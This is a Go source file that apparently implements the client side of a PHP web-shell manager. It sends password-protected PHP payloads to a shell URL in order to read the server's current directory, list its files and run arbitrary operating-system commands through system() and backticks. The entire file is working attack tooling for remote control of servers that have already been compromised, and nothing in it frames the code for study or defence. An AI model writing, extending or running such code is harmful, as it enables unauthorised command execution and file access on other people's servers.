package service

import (
	"clouddrop/pkg/util"
	"strings"
)

func (s *PHPShell) GetShellType() string {
	return "php"
}

// GetCurrentDirectory retrieves the current directory from the PHP shell
func (s *PHPShell) GetCurrentDirectory(url string, password string) (string, error) {
	code := `echo getcwd();`
	result, err := util.PostRequest(url, password, code)
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(result), nil
}

// ListFiles lists all files in the current directory
func (s *PHPShell) ListFiles(url string, password string) ([]string, error) {
	code := `
	$files = scandir(getcwd());
	foreach ($files as $file) {
		if ($file != "." && $file != "..") {
			echo $file . "\n";
		}
	}
	`

	result, err := util.PostRequest(url, password, code)
	if err != nil {
		return nil, err
	}

	files := strings.Split(strings.TrimSpace(result), "\n")
	return files, nil
}

func (s *PHPShell) ExecCommand(url string, password string, command string) (string, error) {
	code := `system(` + "`" + command + "`" + `);`
	result, err := util.PostRequest(url, password, code)
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(result), nil
}
